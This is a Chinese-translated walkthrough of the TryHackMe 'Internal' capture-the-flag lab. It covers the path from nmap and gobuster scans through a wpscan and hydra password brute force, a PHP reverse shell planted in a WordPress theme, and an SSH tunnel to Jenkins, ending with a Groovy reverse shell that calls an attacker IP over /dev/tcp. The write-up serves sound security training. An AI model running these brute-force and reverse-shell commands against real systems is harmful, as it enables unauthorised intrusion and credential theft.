<html>
<head>
<title>TryHackMe: Internal Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:内部报告</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-internal-writeup-480ce471efdd?source=collection_archive---------0-----------------------#2020-08-28">https://infosecwriteups.com/tryhackme-internal-writeup-480ce471efdd?source=collection_archive---------0-----------------------#2020-08-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b4cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本文中，我将展示我完成<strong class="jp ir">内部</strong> Capture The Flag (CTF)的方法，这是一个由<em class="kl"> TheMayor创建的TryHackMe平台上的免费渗透测试挑战室。</em>我在下面的参考资料中提供了TryHackMe平台的链接，供有兴趣试用这款CTF的人参考。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/c208b887642eabc56cc52e8c3c80f5e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*1ouHNbGmUsNyabhTDA8OzA.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="ec8b" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">放弃</h1><p id="291f" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读这篇文章之前尝试一下这个房间，因为在这篇文章中显然会有<strong class="jp ir">剧透</strong><strong class="jp ir"/>。我相信，如果你先自己尝试一下，然后在遇到困难或需要提示时再来写这篇文章，你会更喜欢CTF。因此，没有任何进一步的拖延，让我们开始吧！</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="87fc" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">CTF背景—内部测试</h1><p id="4f11" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我在下面提供了作者创建的项目前简报的摘要版本。</p><blockquote class="me mf mg"><p id="8ae6" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">您被指派给一个客户，该客户希望在一个将于三周内发布到生产环境中进行渗透测试。客户端要求您保护两个标志(未提供位置)作为攻击的证据:</p><p id="b8f8" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">- <strong class="jp ir"> User.txt </strong></p><p id="8c70" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">- <strong class="jp ir"> Root.txt </strong></p><p id="dc73" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">此外，客户还提供了以下范围津贴:</p><p id="f478" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">-确保修改您的主机文件以反映<strong class="jp ir"> internal.thm </strong></p><p id="2f3f" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">-本项目中允许使用任何工具或技术</p><p id="d02c" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">-找到并记录发现的所有漏洞</p><p id="70b2" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">-将发现的标志提交到仪表板</p><p id="ff5d" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">-只有分配给机器的IP地址在范围内</p><p id="87d2" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">注意:CTF的作者也鼓励玩家把这个挑战当作一个真正的<strong class="jp ir">渗透测试</strong>，因为这将有利于你为电子安全eCPPT或作为该领域渗透测试员的职业生涯做准备。</p></blockquote><p id="7824" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于本文，我将只关注检索用户和根标志。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="cfba" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">列举</h1><p id="5fbe" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我首先修改了位于<strong class="jp ir"> /etc/hosts </strong>的hosts文件，并按照预先约定概要的指示为<strong class="jp ir"> internal.thm </strong>创建了一个条目。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="a7ca" class="mp lc iq ml b gy mq mr l ms mt">10.10.252.171   internal.thm # entry in hosts file (use your own IP)</span></pre><p id="172d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我开始用<strong class="jp ir"> NMAP </strong>扫描目标机器，寻找任何打开的端口。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="ec21" class="mp lc iq ml b gy mq mr l ms mt">nmap -sV -sC -v -Pn -oN nmap_report 10.10.252.171</span></pre><p id="79a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">NMAP命令可以细分如下:</p><ul class=""><li id="c43e" class="mu mv iq jp b jq jr ju jv jy mw kc mx kg my kk mz na nb nc bi translated"><strong class="jp ir"> -Pn </strong>:禁用主机发现。</li><li id="689c" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -sV </strong>:对服务进行版本检测。</li><li id="74ad" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -sC </strong>:使用NMAP提供的默认脚本执行脚本扫描。</li><li id="0b96" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -v </strong>:提供关于NMAP扫描的详细信息。</li><li id="6218" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -oN </strong>:将扫描结果输出到文件。</li></ul><p id="677c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我找到了两个开放的端口，端口22和端口80。我决定检查端口80上托管了什么，并找到了Apache2的默认欢迎页面。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi ni"><img src="../Images/4257a5b8c50885c618ac3461c3d96ba2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RxUTCVvL80lzqKXNJ7TrKw.png"/></div></div></figure><p id="7fa3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我决定使用<strong class="jp ir"> GoBuster </strong>，看看是否有隐藏的网页或目录。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="780d" class="mp lc iq ml b gy mq mr l ms mt">gobuster dir -u <a class="ae nn" href="http://internal.thm/" rel="noopener ugc nofollow" target="_blank">http://internal.thm/</a> -w /usr/share/wordlists/dirb/common.txt </span></pre><p id="1c1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">GoBuster能够识别几个有趣的隐藏网页，如下图所示。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/acd8d12197b84efa1fb90bc8c4457965.png" data-original-src="https://miro.medium.com/v2/resize:fit:642/format:webp/1*5B8u2RMrbQyZg7W_RW0c2Q.png"/></div></figure><p id="66cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看<strong class="jp ir"> /blog </strong>页面，我可以看到一个简单的<strong class="jp ir">博客站点被托管在目标机器上。</strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/eac572e65a63b40f60e63271592992ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1032/format:webp/1*-9s2B4s3rn7BLJYE-JT4Xw.png"/></div></figure><p id="9b20" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向下滚动页面，我还可以看到一个链接，把我带到一个wordpress登录页面。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/580ddde20dacf2cc08d30f9e1ca91e95.png" data-original-src="https://miro.medium.com/v2/resize:fit:784/format:webp/1*3pMMfoFIIZPF-zUnSST53g.png"/></div></figure><p id="5470" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">GoBuster还发现了第二个名为<strong class="jp ir"> /phpmyadmin </strong>的登录页面，如下所示。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/925a175a63d548025376fb28b8dfde0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:926/format:webp/1*2xzrivoZObuh1M8_qGWkvQ.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="e4c5" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated"><strong class="ak">易受攻击的WordPress登录</strong></h1><p id="c09d" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我决定首先关注WordPress站点的登录页面。在尝试了几个不同的凭证后，我看到根据我输入的用户名会出现不同的错误消息。例如，如果我输入凭证<strong class="jp ir"> test:test </strong>，将显示以下错误消息。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/49e2e5f78b222b36aa5321c0c3d90bd8.png" data-original-src="https://miro.medium.com/v2/resize:fit:756/format:webp/1*xoyfR1bb70q-NXbdqg7DtA.png"/></div></figure><p id="f5a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，如果我输入凭证<strong class="jp ir"> admin:test </strong>，则会显示不同的错误消息。这告诉我有一个名为<strong class="jp ir"> admin </strong>的用户。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/496a738db9ccb5446eb88995701b4bbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:722/format:webp/1*TTMnbcGe5odtvG01hMxMcA.png"/></div></figure><p id="b66a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到这种情况，我决定使用<strong class="jp ir"> wpscan </strong>工具尝试使用<strong class="jp ir"> rockyou.txt单词表</strong>强制用户名<strong class="jp ir"> admin </strong>登录，如下所示。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="cee6" class="mp lc iq ml b gy mq mr l ms mt">wpscan --url internal.thm/wordpress/ --passwords rockyou.txt --usernames admin --max-threads 50</span></pre><p id="a42d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这很有效，我能够恢复用户admin的密码。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/18c762aeb582d75020e66bb1051ce5a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1268/format:webp/1*-VHVmyGHA4kAe67LiP9kug.png"/></div></figure><p id="94bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">成功登录后，我开始寻找任何有趣的信息。我注意到在这个例子中使用的WordPress版本是<strong class="jp ir"> 5.4.2 </strong>。我还看到用户admin发了两个帖子，其中一个设置为private，没有标题。看着这个帖子，我找到了一组用户<strong class="jp ir"> william </strong>的凭证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/4f288e6627608c7a40483b262b735326.png" data-original-src="https://miro.medium.com/v2/resize:fit:872/format:webp/1*9L6Dn7_yRDge7Q5TzbiK0g.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="b9ae" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">WordPress反向外壳</h1><p id="a8dd" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">尽管找到了这些凭证，我还是无法使用它们SSH到目标机器或者登录到<strong class="jp ir"> /phpmyadmin </strong>页面。在网上搜索了一番后，我找到了一篇文章(<strong class="jp ir">见参考文献</strong>)，它展示了几种不同的获得逆向shell的方法。一种方法是<strong class="jp ir">在WP_Theme </strong>中注入恶意代码，通过导航到<em class="kl">Appearances-&gt;Editor-&gt;404.php</em>，然后注入Pentestmonkey提供的PHP反向shell(<strong class="jp ir">参见参考文献</strong>)。我只是把PHP代码中的IP地址和端口号改成了我自己的。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/aedf985a88315d7d71ce84e37888e069.png" data-original-src="https://miro.medium.com/v2/resize:fit:1222/format:webp/1*9NRh7SigKp_JnsO5cRePCw.png"/></div></figure><p id="60e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我点击按钮<strong class="jp ir">更新文件</strong>并设置netcat监听端口4444。最后，我导航到下面看到的URL地址，并以用户<strong class="jp ir"> www-data </strong>的身份在目标机器上获得了一个反向shell。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="6bbf" class="mp lc iq ml b gy mq mr l ms mt">http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi nx"><img src="../Images/ba8c030bf75abf14d4ab6668dc10b72d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YzYrbayWwOlaDtvBIH8pOQ.png"/></div></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="9873" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">用户权限提升</h1><p id="00f9" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">获得一个反向外壳后，我开始寻找提升权限的方法。查看主目录，我看到有一个名为<strong class="jp ir"> aubreanna </strong>的用户目录，但是我没有权限查看它的内容。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/f65c3013c1af1d81c433f102b8dc9c70.png" data-original-src="https://miro.medium.com/v2/resize:fit:848/format:webp/1*QAnnViGOiXCDyMp5bfwvDw.png"/></div></figure><p id="b06a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查<strong class="jp ir"> /etc </strong>目录时，偶然发现了<strong class="jp ir"> /phpmyadmin </strong>目录。通过检查这个目录，我能够找到Gobuster之前发现的登录页面的凭证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi nz"><img src="../Images/c5b2e6a6c441c06164e508c6fcdc764c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OaQBoGtXdmmw7lCLk-imfQ.png"/></div></div></figure><p id="e9e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些凭证允许我成功登录并查看数据库，但是我没有找到任何允许我提升权限的东西。我还找到了一个名为<strong class="jp ir"> /wordpress </strong>的目录，其中包含了<strong class="jp ir"/>WordPress数据库的凭证。我可以在<strong class="jp ir"> /myphpadmin </strong>登录网页中使用这些凭证来查看wordpress数据库。然而，我仍然没有找到任何有趣的信息。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/915f1f2266e548902c4c7f71ae064302.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mt9Oh4wRewpowRHJtaHR0g.png"/></div></figure><p id="6556" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过进一步的搜索，我在<strong class="jp ir"> /opt </strong>目录中找到了一个名为<strong class="jp ir"> wp-save.txt </strong>的有趣文件。打开这个文件，我能够找到用户<strong class="jp ir"> aubreanna </strong>的凭证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi ob"><img src="../Images/df6164cdab1c9e36a62177718cb98a3c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cd_Xc14BsP-Yc2JpqKUpRw.png"/></div></div></figure><p id="3998" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用这些凭证，我可以成功地SSH到目标机器并获得<strong class="jp ir"> user.txt </strong>标志。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/3809a6eb2ac7f842153c65d340f01bc5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/format:webp/1*Puc1Qgbk_oh_KId-RWZqaA.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="f76b" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">根权限提升</h1><p id="cd1c" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">还发现了一个名为<strong class="jp ir"> Jenkins.txt </strong>的文件，其中包含一条有趣的信息。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/29b693f5c0c9bc985d5f2d9bd260c177.png" data-original-src="https://miro.medium.com/v2/resize:fit:1218/format:webp/1*QO_XceP88Gt6vuMVkpWbBA.png"/></div></figure><p id="22e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">显然有一个Jenkins服务在目标机器内部运行。我可以使用<strong class="jp ir"> SSH隧道</strong>连接到这个远程服务，并使它可以在我的本地机器上访问(<strong class="jp ir">参见参考文献</strong>)。为了实现这一点，我可以简单地与SSH服务器建立一个SSH连接，并告诉客户端将来自我的本地主机的特定端口的流量(即<strong class="jp ir"> localhost:4444 </strong>)转发到服务的地址及其端口(即<strong class="jp ir"> 172.17.0.2:8080 </strong>)。完整的命令可以在下面看到。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="a5a0" class="mp lc iq ml b gy mq mr l ms mt">ssh -L 4444:172.17.0.2:8080 aubreanna@10.10.252.171</span></pre><p id="f5ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，当我在浏览器中键入<strong class="jp ir"> localhost:4444 </strong>时，可以访问Jenkins服务的登录页面。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/986dd4f306b147033440b6d395631ac7.png" data-original-src="https://miro.medium.com/v2/resize:fit:714/format:webp/1*xqGgraa7n3suCQW3-qSglA.png"/></div></figure><p id="3546" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我决定在目标机器的其他地方寻找一些隐藏的登录凭证，但是我什么也找不到。在线快速搜索显示，Jenkins登录的默认凭证是<strong class="jp ir">admin</strong>/<strong class="jp ir">password</strong>，但这也无法工作。我最终决定尝试使用<strong class="jp ir"> hydra </strong>强行登录。使用chrome上的开发工具，我检查了提交凭证时登录页面使用了哪些参数。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi of"><img src="../Images/532db261c09137c0ede9e684185f5071.png" data-original-src="https://miro.medium.com/v2/resize:fit:894/format:webp/1*eUiM-Q4dVOs8bU5-VVihKA.png"/></div></figure><p id="493d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">每次尝试登录时，都需要提供上面以红色突出显示的参数。我决定使用用户名<strong class="jp ir"> admin </strong>，因为这是Jenkins的默认用户名，并尝试使用这些参数强行破解密码。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="5c51" class="mp lc iq ml b gy mq mr l ms mt">hydra 127.0.0.1 -s 4444 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password" -l admin -P rockyou.txt</span></pre><p id="d2ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">九头蛇司令部的详细情况如下:</p><ul class=""><li id="0616" class="mu mv iq jp b jq jr ju jv jy mw kc mx kg my kk mz na nb nc bi translated"><strong class="jp ir"> -s </strong>:端口号</li><li id="dd69" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -f </strong>:一旦找到密码，停止暴力破解登录页面。</li><li id="a957" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -V </strong>:显示九头蛇的企图等细节。</li><li id="39c3" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> http-form-post </strong>:表示正在使用的表单类型(即post)。</li><li id="1e97" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> ^USER^: </strong>告诉九头蛇使用字段中的用户名或列表。</li><li id="a7ea" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> ^PASS^: </strong>告诉九头蛇使用提供的密码列表。</li><li id="88ab" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -l: </strong>表示单个用户名，例如“admin”(使用<strong class="jp ir"> -L </strong>查看用户名列表)。</li><li id="9c1e" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><strong class="jp ir"> -P: </strong>表示使用以下密码列表，例如<strong class="jp ir"> rockyou.txt </strong></li></ul><p id="838a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行这个命令导致用户<strong class="jp ir"> admin </strong>的凭证被恢复，允许我登录到Jenkins。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi og"><img src="../Images/543136a226264dc60dd8fbc237dad3ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KHLibih5cKxnHpKwjtA9cg.png"/></div></div></figure><p id="79b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Google上快速搜索会发现许多利用Jenkins漏洞获得反向外壳的方法。我使用的方法是利用Jenkins上的<strong class="jp ir">脚本控制台</strong>功能。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/ca11b1b707c3a409538e8c6bfba83cec.png" data-original-src="https://miro.medium.com/v2/resize:fit:762/format:webp/1*_Uvt-m5AIlDXxYnbXr44Vw.png"/></div></figure><p id="e9d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要在系统上创建一个反向shell，我们需要使用Groovy脚本。既然基本都是Java，我们可以用一个pentestmonkey的Java反向shell。</p><pre class="kn ko kp kq gt mk ml mm mn aw mo bi"><span id="9df9" class="mp lc iq ml b gy mq mr l ms mt">r = Runtime.getRuntime()<br/>p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.2.36.156/5555;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])<br/>p.waitFor()</span></pre><p id="0495" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我可以监听端口5555上的连接，并成功获得一个反向shell。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/09f6c76eae2c058c2d04f3147f940097.png" data-original-src="https://miro.medium.com/v2/resize:fit:1366/format:webp/1*Ku3uIZhowDqUEPAstDCuZA.png"/></div></figure><p id="cbad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看容器系统，我发现一个存储在<strong class="jp ir"> /opt </strong>目录中的<strong class="jp ir"> note.txt </strong>文件，其中包含一条消息和用户root的凭证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi oj"><img src="../Images/7ed2c16e6678767720b8624d009ea609.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Se-zqwtx5XkfjPA5yoECtg.png"/></div></div></figure><p id="6c8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用这些凭证，我可以作为root用户SSH并获得root标志😃！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/162b5dfeae3fb8fc2814a187aaf73946.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/1*PXZnoI25E1pcmetU4dITaA.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="b253" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">结束语</h1><p id="af5b" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">这是TryHackMe平台上提供的一个有趣且具有挑战性的CTF。我发现这是一个很好的方法来学习更多关于渗透测试的知识，结合了广泛的易受攻击的服务来利用和测试技术。感谢阅读到最后，继续黑客！</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="7080" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">参考</h1><ul class=""><li id="b544" class="mu mv iq jp b jq lz ju ma jy ol kc om kg on kk mz na nb nc bi translated"><a class="ae nn" href="https://tryhackme.com/" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/</a></li><li id="36ba" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><a class="ae nn" href="https://www.hackingarticles.in/wordpress-reverse-shell/" rel="noopener ugc nofollow" target="_blank">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li><li id="f915" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><a class="ae nn" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel="noopener ugc nofollow" 